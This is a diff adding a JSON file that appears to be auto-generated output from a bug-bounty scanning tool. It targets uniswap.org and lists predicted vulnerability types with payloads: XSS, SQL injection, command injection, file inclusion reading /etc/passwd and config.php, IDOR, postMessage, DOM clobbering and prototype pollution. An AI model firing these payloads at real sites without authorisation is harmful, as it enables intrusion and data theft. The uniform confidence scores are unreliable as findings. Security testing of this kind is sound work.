@@ -1,0 +1,155 @@
+{
+  "target": "https://uniswap.org",
+  "timestamp": "2025-12-01T13:04:43.263010",
+  "elite_enhancements": {
+    "santiago_lopez": {
+      "roi_score": 1.0,
+      "recommended_focus": "any_bugs",
+      "time_allocation": "standard"
+    },
+    "rhynorater": {
+      "complexity_score": 0.0,
+      "crown_jewels": [],
+      "deep_dive_recommended": false
+    },
+    "frans_rosen": {
+      "dom_vulnerabilities": [
+        {
+          "type": "postMessage",
+          "confidence": 0.3,
+          "test_urls": [
+            "https://uniswap.org#postMessage_test"
+          ],
+          "payloads": [
+            "<script>window.postMessage({data:\"test\"}, \"*\")</script>"
+          ],
+          "method": "DOM_ANALYSIS"
+        },
+        {
+          "type": "dom_clobbering",
+          "confidence": 0.25,
+          "test_urls": [
+            "https://uniswap.org#dom_clobbering_test"
+          ],
+          "payloads": [
+            "<form name=\"config\"><input name=\"apiEndpoint\"></form>"
+          ],
+          "method": "DOM_ANALYSIS"
+        },
+        {
+          "type": "prototype_pollution",
+          "confidence": 0.2,
+          "test_urls": [
+            "https://uniswap.org#prototype_pollution_test"
+          ],
+          "payloads": [
+            "__proto__.isAdmin=true"
+          ],
+          "method": "DOM_ANALYSIS"
+        }
+      ],
+      "recommended_tools": [
+        "DomLogger++",
+        "postMessage-tracker",
+        "Param Miner"
+      ]
+    },
+    "monke": {
+      "recommended_tools": [
+        "Caido",
+        "ProjectDiscovery suite"
+      ],
+      "work_strategy": "Pomodoro sessions with regular breaks",
+      "note_taking": "Obsidian mind maps for attack surface"
+    }
+  },
+  "predictions": [
+    {
+      "type": "xss",
+      "confidence": 1.0,
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "\"><script>alert(1)</script>"
+      ],
+      "roi_multiplier": 1.0,
+      "deep_dive_recommended": false
+    },
+    {
+      "type": "sqli",
+      "confidence": 1.0,
+      "payloads": [
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "' UNION SELECT 1,2,3 --"
+      ],
+      "roi_multiplier": 1.0,
+      "deep_dive_recommended": false
+    },
+    {
+      "type": "command_injection",
+      "confidence": 1.0,
+      "payloads": [
+        "127.0.0.1; whoami",
+        "127.0.0.1 | ls",
+        "127.0.0.1 && echo test"
+      ],
+      "roi_multiplier": 1.0,
+      "deep_dive_recommended": false
+    },
+    {
+      "type": "lfi",
+      "confidence": 1.0,
+      "payloads": [
+        "../../../../../etc/passwd",
+        "php://filter/read=convert.base64-encode/resource=config.php"
+      ],
+      "roi_multiplier": 1.0,
+      "deep_dive_recommended": false
+    },
+    {
+      "type": "idor",
+      "confidence": 1.0,
+      "payloads": [
+        "user_id=1",
+        "user_id=2",
+        "user_id=3"
+      ],
+      "roi_multiplier": 1.0,
+      "deep_dive_recommended": false
+    },
+    {
+      "type": "postMessage",
+      "confidence": 0.3,
+      "test_urls": [
+        "https://uniswap.org#postMessage_test"
+      ],
+      "payloads": [
+        "<script>window.postMessage({data:\"test\"}, \"*\")</script>"
+      ],
+      "method": "DOM_ANALYSIS"
+    },
+    {
+      "type": "dom_clobbering",
+      "confidence": 0.25,
+      "test_urls": [
+        "https://uniswap.org#dom_clobbering_test"
+      ],
+      "payloads": [
+        "<form name=\"config\"><input name=\"apiEndpoint\"></form>"
+      ],
+      "method": "DOM_ANALYSIS"
+    },
+    {
+      "type": "prototype_pollution",
+      "confidence": 0.2,
+      "test_urls": [
+        "https://uniswap.org#prototype_pollution_test"
+      ],
+      "payloads": [
+        "__proto__.isAdmin=true"
+      ],
+      "method": "DOM_ANALYSIS"
+    }
+  ]
+}
